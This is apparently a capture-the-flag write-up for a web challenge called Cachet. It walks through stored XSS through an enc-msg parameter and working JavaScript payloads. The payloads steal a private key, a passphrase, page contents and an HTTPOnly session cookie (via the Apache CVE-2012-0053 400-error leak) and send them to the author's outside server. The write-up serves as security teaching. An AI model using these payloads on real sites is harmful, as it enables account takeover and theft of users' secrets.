# Web 500 (Cachet)

# Scenario
We need you. Things have been crazy with all the leaks lately. Apparently somebody gave one of our clients a tip that Julian Assange has acquired some devastating data about the US government. Our client has asked us to get this data for them. They're saying they can sell this data and makes lots of money of off it or something. Doesn't matter, they're paying us as long as we can get the data for them. The only tip we have is that Julian has been using this new security and privacy focused messaging app called Cachet to communicate with the source of the leaked data. He's supposedly taken a liking to it and uses it pretty frequently. Our interns looked at it but haven't had any luck, so we need your expertise on this one.

# TL;DR solution

Get XSS on user julianassange via the enc-msg POST param when sending him a message. Use this XSS to get his private key and passphrase (julianassange reads all messages sent to him). Then use this XSS to read the read.php for julianassange, where you'll find a subject that mentions what his PIN is. Then the only possible way (at least i think) to read his message is to steal his session cookie, which is set to HTTPOnly. You can get it by forcing him to make a request to the dev site on port 8000 that results in a 400 response, b/c the dev site is running apache 2.2.21 which has [this](https://www.cvedetails.com/cve/CVE-2012-0053/) vuln, so the full HTTP request that caused the 400 resposne will be returned.

# More details

So as the scenario points out, Julian Assange is the target. If you go to the search page (find.php), you can enumerate all the valid uses by entering % into the field. User 3 is julianassange, which is the target. After exploring the site, one would eventually realize that one of the view vectors available are XSS. This is made possible when sending a message to another user. Since the encryption of the message happens client side, the message is sent encrypted already to the server. When viewing a message, the devs must have thought nobody could enter malicious HTML in the encrypted message so they didn't HTML encode it resulting in XSS on a user reading a message to them before decrypting it. The POST parameter to intercept and add your XSS payload to would be enc-msg, and this could be done by proxying your traffic through Burp Suite or similar tool. So here is a POC to get the first items required, the private key and passphrase:

```javascript
<script>
function decrypt_message() {
    var key = document.getElementById("privkey").value;
    var pass = document.getElementById("msg-subject").value;
    var oReq = new XMLHttpRequest();
    oReq.open("GET", "http://lukeis.sexy/?key=" + key + "?pass=" + pass);
    oReq.send();

    decryptMessage();
}
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById("decrypt-button").onclick = decrypt_message;
}, false);
</script>
```

This POC overrides the functionality of the decrypt button so that my own function runs first to get data and send it to my server, then calls the original decrypt message so the user doesn't suspect anything (though this isn't needed). My function gets the private key and passphrase and uses an XMLHttpRequests (xhr) to send the data to a server that I own. Next, the PIN is required as well as some original message sent to julianassange. So poking around is the next option, which can be done by requesting the other pages and seeing what they have. This POC gets the read messages page:

```javascript
<script>
var oReq = new XMLHttpRequest();
oReq.onreadystatechange = function(){
if(oReq.readyState === XMLHttpRequest.DONE) {
    var xhr = new XMLHttpRequest();
    console.log(oReq.responseText);
    xhr.open("GET", "http://lukeis.sexy/?read=" + oReq.responseText);
    xhr.send();
}
};
oReq.open("GET", "/read.php");
oReq.send();
</script>
```

The astute reader will realize that there will be too much data in the URL to show up in regular access logs for the request to my server. However, I am lazy and didn't want to write this up using POST request which would have been effective at sending all the data. But seeing the results of the read page, one of the subject messages says that julianassange's PIN is his birthday. This is in the format of MMDDYYYY, so 03071971 for julianassange. At this point, many believed that they could use the XSS to CSRF the user and get the message that they received from the darkarmy account (as seen in the results of the read page). But that would be too easy. So the referer is checked to make sure the request came from the bot (which ran locally) and that it ended with messages.php?id=X, where X is the message ID trying to be read. This should prevent CSRF b/c you would have to force the user to go to the messages.php?id=X page and then XSS them from there. Without the referer check the CSRF would be possible, but with it there shouldn't be a way to perform CSRF successfully. Although people are crafty and may have come up with ways around this (some users claimed they bypassed it using iframes when testing against themselves). There was a twitter picture that showed a call to a function called referer_good(), which should have hinted that there was a referer check when reading messages. So then one possibility to read the message would be to get it from the database, but there were not any intentional SQL injections put into the app so this shouldn't have been a viable option. The way to read julianassange's messages was to get his session cookie (PHPSESSID). These cookies were good for up to 2 weeks. But the darn HTTPOnly flag was set on the cookies, so getting it via javascript in an XSS wouldn't work. Except, that's exactly how you would get this cookie. You just can't call document.cookie, there is a different way. The dev server was running on port 8000 and the Apache version was running 2.2.21, which has [this](https://www.cvedetails.com/cve/CVE-2012-0053/) vulnerability which returns the full request in the response when the response is a 400 error. So if you can figure out how to make a request to the dev server from julianassange that results in a 400 error you could get the cookie in the result to that request and send that off to your server. The /dev/ page on the main/prod site mentioned that security team wanted them to patch the server so they just moved it to dev, which was true and was the only valuable piece of information on the /dev/ page. The creds and command injections were just distractions. Another odd thing is that the dev site has 2 CORS headers set. Without these headers, the response from the dev server wouldn't be accessible via javascript. The "Access-Control-Allow-Credentials" header allows the cookie to be sent to the dev server, and the "Access-Control-Allow-Origin" header allows the response to be returned to the caller so it can read the response. So here's a POC to get the session cookie from julianassange:

```javascript
<script>
document.cookie = "test=" + Array(4000).join("A");
document.cookie = "test2=" + Array(4000).join("A");
document.cookie = "test3=" + Array(4000).join("A");
var oReq = new XMLHttpRequest();
oReq.onreadystatechange = function(){
if(oReq.readyState === XMLHttpRequest.DONE) {
    var xhr = new XMLHttpRequest();
    console.log(oReq.responseText);
    xhr.open("GET", "http://lukeis.sexy/?phpsessid=" + oReq.responseText);
    xhr.send();
    document.cookie = "test=B"; //so other requests aren't borked
    document.cookie = "test2=B";
    document.cookie = "test3=B";
}
};
oReq.open("GET", "http://54.172.225.153:8000");
oReq.withCredentials = true;
oReq.send();
</script>
```

With all this information, you can now login as julian assange by spoofing his PHPSESSID cookie. Then you go to the read messages page and click on the one from darkarmy. You enter the PIN which you figured out previously (03071971), then you enter the private key and passphrase and the message would be decrypted which contained the flag and a fun zip file with some bidenbro memes.

Flag: RC3-2016-12409901
